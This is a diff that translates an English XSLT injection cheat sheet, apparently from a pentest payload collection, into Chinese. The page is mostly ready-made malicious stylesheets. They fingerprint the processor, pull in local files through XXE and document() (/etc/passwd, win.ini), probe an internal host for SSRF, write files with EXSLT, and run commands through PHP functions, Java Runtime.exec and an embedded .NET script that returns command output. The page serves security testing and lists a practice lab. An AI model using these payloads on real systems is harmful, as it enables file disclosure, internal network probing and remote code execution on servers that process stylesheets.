@@ -1,28 +1,30 @@
+[原文文档](README.en.md)
+
 # XSLT Injection
 
-> Processing an un-validated XSL stylesheet can allow an attacker to change the structure and contents of the resultant XML, include arbitrary files from the file system, or execute arbitrary code
+> 处理未验证的XSL样式表可能允许攻击者更改结果XML的结构和内容，包含文件系统中的任意文件，或执行任意代码
 
-## Summary
+## 摘要
 
-- [Tools](#tools)
-- [Methodology](#methodology)
-    - [Determine the Vendor And Version](#determine-the-vendor-and-version)
-    - [External Entity](#external-entity)
-    - [Read Files and SSRF Using Document](#read-files-and-ssrf-using-document)
-    - [Write Files with EXSLT Extension](#write-files-with-exslt-extension)
-    - [Remote Code Execution with PHP Wrapper](#remote-code-execution-with-php-wrapper)
-    - [Remote Code Execution with Java](#remote-code-execution-with-java)
-    - [Remote Code Execution with Native .NET](#remote-code-execution-with-native-net)
-- [Labs](#labs)
-- [References](#references)
+- [工具](#工具)
+- [方法论](#方法论)
+    - [确定供应商和版本](#确定供应商和版本)
+    - [外部实体](#外部实体)
+    - [使用Document读取文件和SSRF](#使用document读取文件和ssrf)
+    - [使用EXSLT扩展写入文件](#使用exslt扩展写入文件)
+    - [使用PHP包装器远程代码执行](#使用php包装器远程代码执行)
+    - [使用Java远程代码执行](#使用java远程代码执行)
+    - [使用原生.NET远程代码执行](#使用原生net远程代码执行)
+- [实验室](#实验室)
+- [参考资料](#参考资料)
 
-## Tools
+## 工具
 
-No known tools currently exist to assist with XSLT exploitation.
+目前没有已知的工具来协助XSLT利用。
 
-## Methodology
+## 方法论
 
-### Determine the Vendor and Version
+### 确定供应商和版本
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
@@ -37,33 +39,33 @@ No known tools currently exist to assist with XSLT exploitation.
 <?xml version="1.0" encoding="UTF-8"?>
 <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
 <body>
-<br />Version: <xsl:value-of select="system-property('xsl:version')" />
-<br />Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
-<br />Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
+<br />版本: <xsl:value-of select="system-property('xsl:version')" />
+<br />供应商: <xsl:value-of select="system-property('xsl:vendor')" />
+<br />供应商URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
 </body>
 </html>
 ```
 
-### External Entity
+### 外部实体
 
-Don't forget to test for XXE when you encounter XSLT files.
+遇到XSLT文件时不要忘记测试XXE。
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "C:\secretfruit.txt">]>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:template match="/fruits">
-    Fruits &ext_file;:
-    <!-- Loop for each fruit -->
+    水果 &ext_file;:
+    <!-- 循环遍历每个水果 -->
     <xsl:for-each select="fruit">
-      <!-- Print name: description -->
+      <!-- 打印名称：描述 -->
       - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
     </xsl:for-each>
   </xsl:template>
 </xsl:stylesheet>
 ```
 
-### Read Files and SSRF Using Document
+### 使用Document读取文件和SSRF
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
@@ -72,19 +74,19 @@ Don't forget to test for XXE when you encounter XSLT files.
     <xsl:copy-of select="document('http://172.16.132.1:25')"/>
     <xsl:copy-of select="document('/etc/passwd')"/>
     <xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>
-    Fruits:
-     <!-- Loop for each fruit -->
+    水果:
+     <!-- 循环遍历每个水果 -->
     <xsl:for-each select="fruit">
-      <!-- Print name: description -->
+      <!-- 打印名称：描述 -->
       - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
     </xsl:for-each>
   </xsl:template>
 </xsl:stylesheet>
 ```
 
-### Write Files with EXSLT Extension
+### 使用EXSLT扩展写入文件
 
-EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet Language Transformations) language. EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet Language Transformations) language.
+EXSLT，即可扩展样式表语言转换，是XSLT（可扩展样式表语言转换）语言的一组扩展。
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -101,9 +103,9 @@ EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions
 </xsl:stylesheet>
 ```
 
-### Remote Code Execution with PHP Wrapper
+### 使用PHP包装器远程代码执行
 
-Execute the function `readfile`.
+执行函数`readfile`。
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -114,7 +116,7 @@ Execute the function `readfile`.
 </html>
 ```
 
-Execute the function `scandir`.
+执行函数`scandir`。
 
 ```xml
 <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
@@ -124,7 +126,7 @@ Execute the function `scandir`.
 </xsl:stylesheet>
 ```
 
-Execute a remote php file using `assert`
+使用`assert`执行远程php文件
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -138,7 +140,7 @@ Execute a remote php file using `assert`
 </html>
 ```
 
-Execute a PHP meterpreter using PHP wrapper.
+使用PHP包装器执行PHP meterpreter。
 
 ```xml
 <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
@@ -151,7 +153,7 @@ Execute a PHP meterpreter using PHP wrapper.
 </xsl:stylesheet>
 ```
 
-Execute a remote php file using `file_put_contents`
+使用`file_put_contents`执行远程php文件
 
 ```xml
 <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
@@ -161,7 +163,7 @@ Execute a remote php file using `file_put_contents`
 </xsl:stylesheet>
 ```
 
-### Remote Code Execution with Java
+### 使用Java远程代码执行
 
 ```xml
   <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
@@ -179,11 +181,11 @@ Execute a remote php file using `file_put_contents`
 <xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
 <xsl:template match="/">
 <xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')" xmlns:Runtime="java:java.lang.Runtime"/>
-</xsl:template>.
+</xsl:template>. 
 </xsl:stylesheet>
 ```
 
-### Remote Code Execution with Native .NET
+### 使用原生.NET远程代码执行
 
 ```xml
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:App="http://www.tempuri.org/App">
@@ -232,21 +234,21 @@ return proc.StandardOutput.ReadToEnd();
 </msxsl:script>
 
   <xsl:template match="/fruits">
-  --- BEGIN COMMAND OUTPUT ---
+  --- 命令输出开始 ---
  <xsl:value-of select="user:execute()"/>
-  --- END COMMAND OUTPUT --- 
+  --- 命令输出结束 --- 
   </xsl:template>
 </xsl:stylesheet>
 ```
 
-## Labs
+## 实验室
 
-- [Root Me - XSLT - Code execution](https://www.root-me.org/en/Challenges/Web-Server/XSLT-Code-execution)
+- [Root Me - XSLT - 代码执行](https://www.root-me.org/en/Challenges/Web-Server/XSLT-Code-execution)
 
-## References
+## 参考资料
 
-- [From XSLT code execution to Meterpreter shells - Nicolas Grégoire (@agarri) - July 2, 2012](https://www.agarri.fr/blog/archives/2012/07/02/from_xslt_code_execution_to_meterpreter_shells/index.html)
-- [XSLT Injection - Fortify - January 16, 2021](http://web.archive.org/web/20210116001237/https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection)
-- [XSLT Injection Basics - Saxon - Hunnic Cyber Team - August 21, 2019](http://web.archive.org/web/20190821174700/https://blog.hunniccyber.com/ektron-cms-remote-code-execution-xslt-transform-injection-java/)
-- [Getting XXE in Web Browsers using ChatGPT - Igor Sak-Sakovskiy - May 22, 2024](https://swarm.ptsecurity.com/xxe-chrome-safari-chatgpt/)
-- [XSLT injection lead to file creation - PT SWARM (@ptswarm) - May 30, 2024](https://twitter.com/ptswarm/status/1796162911108255974/photo/1)
+- [从XSLT代码执行到Meterpreter shell - Nicolas Grégoire (@agarri) - 2012年7月2日](https://www.agarri.fr/blog/archives/2012/07/02/from_xslt_code_execution_to_meterpreter_shells/index.html)
+- [XSLT注入 - Fortify - 2021年1月16日](http://web.archive.org/web/20210116001237/https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection)
+- [XSLT注入基础 - Saxon - Hunnic Cyber Team - 2019年8月21日](http://web.archive.org/web/20190821174700/https://blog.hunniccyber.com/ektron-cms-remote-code-execution-xslt-transform-injection-java/)
+- [使用ChatGPT在Web浏览器中获取XXE - Igor Sak-Sakovskiy - 2024年5月22日](https://swarm.ptsecurity.com/xxe-chrome-safari-chatgpt/)
+- [XSLT注入导致文件创建 - PT SWARM (@ptswarm) - 2024年5月30日](https://twitter.com/ptswarm/status/1796162911108255974/photo/1)
